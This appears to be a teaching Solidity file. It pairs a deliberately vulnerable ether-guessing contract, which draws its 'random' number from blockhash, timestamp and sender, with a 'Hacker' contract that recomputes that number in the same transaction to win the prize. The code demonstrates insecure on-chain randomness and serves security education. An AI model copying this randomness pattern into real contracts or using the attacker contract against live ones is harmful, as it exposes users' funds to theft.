// // SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.1;

// Search Chainlink VRF Contract for a robust solution of random number generators  
contract WinOneEtherGuessingMyRandomNumber {
    
    constructor() payable {}
    
    function guessing(uint256 answer) public {
        uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp, msg.sender))) % 1_000_000;        
        require(answer == guess, "game over");
        payable(msg.sender).transfer(1 ether);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

}

contract Hacker {
     receive() external payable {}

     function attack(WinOneEtherGuessingMyRandomNumber prey) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp, address(this)))) % 1_000_000;        
        prey.guessing(answer);
     }

     function getBalance() public view returns(uint256) {
         return address(this).balance;
     }
}

